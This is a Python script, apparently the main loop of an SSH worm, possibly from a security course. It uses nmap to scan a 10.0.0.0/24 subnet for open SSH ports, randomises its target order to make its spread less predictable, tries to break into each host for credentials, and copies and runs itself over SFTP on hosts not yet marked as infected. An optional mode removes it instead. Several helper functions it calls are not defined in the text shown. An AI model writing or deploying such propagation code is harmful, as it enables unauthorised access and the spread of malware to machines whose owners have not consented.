import nmap
import netifaces
import random

LOOPBACK_INTERFACE = "lo"

####################################################
# 返回當前系統的IP
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP( interface ):
	# Retrieve and return the IP of the current system.
	# Get the IP address
	ip_addr = netifaces.ifaddresses( interface )[2][0]['addr']

	# The IP address of the interface
	return ip_addr if not ip_addr == "127.0.0.1" else None

def getHostsOnTheSameNetwork( ):
    # Scanning for hosts on the same network and return the list of discovered IP addresses.
    portScanner = nmap.PortScanner()
    portScanner.scan( '10.0.0.0/24', arguments = '-p 22 --open' )
    return portScanner.all_hosts()

interface_list = netifaces.interfaces()
interface_list.remove( LOOPBACK_INTERFACE )

for interface in interface_list:
    print("Interface: ", interface)
    # Get the IP of the current system
    ip_addr = getMyIP( interface )

    # Get the hosts on the same network
    networkHosts = getHostsOnTheSameNetwork()

    # Remove the IP of the current system
    # from the list of discovered systems (we
    # do not want to target ourselves!).
    networkHosts.remove( ip_addr )

    # Randomly shuffle hosts to make spread not predictable
    random.shuffle( networkHosts )

    print("Found hosts: ", networkHosts)

    # Go through the network hosts
    for host in networkHosts:
        # Try to attack this host
        sshInfo =  attackSystem( host )
            
        print(sshInfo)
            
        # Attack succeeded
        if sshInfo:
            print("Credentials Found.\n[ CONNECTING . . . ]")

            sftp_client = sshInfo[0].open_sftp()

            # Check if the system was	
            # already infected. This can be
            # done by checking whether the
            # remote system contains /tmp/infected.txt
            # file (which the worm will place there
            # when it first infects the system)
            if CLEANING_MODE:
                print("[ REMOVING WORM . . . . ]")
                clean_mess( sshInfo[0], sftp_client )
            else:
                if not isInfectedSystem( sftp_client ):
                    # If the system was already infected proceed.
                    # Otherwise, infect the system and terminate.
                    # Infect that system
                    try:
                        print("[ INFECTING . . . . ]")
                        spreadAndExecute( sshInfo[0], sftp_client )
                    except:
                        infecting_error = sys.exc_info()[0]
                        print(infecting_error)
                else:
                    print("[ WORM ALREADY FOUND ]")
            sftp_client.close()